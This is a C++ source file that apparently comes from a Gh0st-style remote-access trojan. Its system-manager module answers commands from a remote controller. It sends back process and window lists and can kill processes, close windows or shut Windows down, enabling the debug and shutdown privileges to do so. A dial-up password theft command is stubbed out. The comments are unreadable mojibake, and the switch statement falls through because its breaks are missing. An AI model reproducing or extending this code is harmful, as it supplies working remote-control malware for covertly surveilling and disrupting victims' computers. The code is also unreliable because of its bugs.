#include "SystemManager.h"
#include<TlHelp32.h>
#include<Psapi.h>

enum
{
	COMMAND_WINDOW_CLOSE,  //�رմ���
	COMMAND_WINDOW_TEST   //��������
};

CSystemManager::CSystemManager(CClientSocket *pClient, BOOL bHow):CManager(pClient)
{
	m_iHow = bHow;
	if (m_iHow == COMMAND_SYSTEM)	// ����ǻ�ȡ����
	{
		SendProcessList();
	}
	else if (m_iHow == COMMAND_WSLIST) // ����ǻ�ȡ����
	{
		SendWindowsList();
	}
}


CSystemManager::~CSystemManager()
{
}


void CSystemManager::SendProcessList()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();      //�õ������б�����ݣ�һ��ת��  getProcessList����
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));   //�õ����͵õ��Ľ����б�����
	LocalFree(lpBuffer);
}


LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = { 0 };
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = { 0 };
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);     //��ȡȨ��
	//����ϵͳ����
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //��ʱ����һ�»�����

	lpBuffer[0] = TOKEN_PSLIST;        //ע�����������ͷ һ�����ǵ����ض��������������ͷ 
	dwOffset = 1;

	if (Process32First(hSnapshot, &pe32))       //�õ���һ������˳���ж�һ��ϵͳ�����Ƿ�ɹ�
	{
		do
		{
			//�򿪽��̲����ؾ��
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID != 0) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				//ö�ٵ�һ��ģ����Ҳ��������
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				//�õ��������������
				GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
				//��ʼ����ռ�õĻ������� ���ǹ������ķ��͵����ݽṹ
				// �˽���ռ�����ݴ�С
				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
				// ������̫С�������·�����
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				//����������memcpy�����򻺳����������� ���ݽṹ�� ����ID+������+0+����������+0
				//Ϊʲô��0 ����Ϊ�ַ���������0 ��β��
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;

				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;
			}
		} while (Process32Next(hSnapshot, &pe32));      //�����õ���һ������
	}
	//��lpbuffer�����������ȥ 
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	DebugPrivilege(SE_DEBUG_NAME, FALSE);  //��ԭ��Ȩ
	CloseHandle(hSnapshot);       //�ͷž�� 
	return lpBuffer;	    //������ݷ��غ���Ƿ����� ֮ǰ�����ˣ����ǿ��Ե����ض�ȥ����TOKEN_PSLIST�ˡ�
}

bool CSystemManager::DebugPrivilege(const char *PName, BOOL bEnable)
{
	// TODO: �ڴ˴����ʵ�ִ���.
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;
}




void CSystemManager::ShutdownWindows(DWORD dwReason)
{
	// TODO: �ڴ˴����ʵ�ִ���.
	DebugPrivilege(SE_SHUTDOWN_NAME, TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
}




void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	// TODO: �ڴ˴����ʵ�ִ���.
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);  //��Ȩ

	for (int i = 0; i < nSize; i += 4)//������ΪʲôҪ��һ��ѭ����  ��Ϊ�����Ŀ��ظ���ֹ��һ������
	{
		//�򿪽���
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
		//��������
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);    //��ԭ��Ȩ
	// ����Sleep�£���ֹ����
	Sleep(100);
	// ˢ�½����б�
	SendProcessList();
	// ˢ�´����б�
	//SendWindowsList();	
	//������� ��һ�ڶ��ֲ�����������������������������������������
}


void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	// TODO: �ڴ˴����ʵ�ִ���.
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:
		//SendDialupassList();
		break;
	case COMMAND_KILLPROCESS:       //�����ǽ��̹���������ݵĺ����� �������ж����Ǹ������KillProcess����
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
	case COMMAND_WINDOW_CLOSE:
		CloseWindow(lpBuffer + 1);
	case COMMAND_WINDOW_TEST:
		TestWindow(lpBuffer + 1);
	default:
		break;
	}
}


LPBYTE CSystemManager::getWindowsList()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;
}


bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;

	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));
	//�õ�ϵͳ���ݽ����Ĵ��ھ���Ĵ��ڱ���
	GetWindowText(hwnd, strTitle, sizeof(strTitle));
	//�����ж� �����Ƿ�ɼ� �����Ϊ��
	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
		return true;
	//ͬ���̹���һ������ע�����ķ��͵����ض˵����ݽṹ

	if (lpBuffer == NULL)
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //��ʱ���仺���� 

	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
	dwOffset = LocalSize(lpBuffer);
	//���¼��㻺������С
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	//��������memcpy���ܿ������ݽṹΪ hwnd+���ڱ���+0
	//GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);

	*(LPBYTE *)lParam = lpBuffer;

	//�������ǵ����ض�����һ�·��͵�TOKEN_WSLIST;����ͷ��
	return true;
}

void CSystemManager::SendWindowsList()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getWindowsList();    //�õ������б������һ��ת����������Ķ���
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));   //�����ض˷��͵õ��Ļ�����һ��ͷ�����
	LocalFree(lpBuffer);
}


void CSystemManager::CloseWindow(LPBYTE buf)
{
	// TODO: �ڴ˴����ʵ�ִ���.
	DWORD hwnd;
	memcpy(&hwnd, buf, sizeof(DWORD));      //�õ����ھ�� 
	::PostMessage((HWND__ *)hwnd, WM_CLOSE, 0, 0); //�򴰿ڷ��͹ر���Ϣ
}


void CSystemManager::TestWindow(LPBYTE buf)
{
	// TODO: �ڴ˴����ʵ�ִ���.
	HWND hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd, buf, sizeof(HWND));      //�õ����ھ��
	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));     //�õ����ڴ������
	ShowWindow(hwnd, dHow);
}
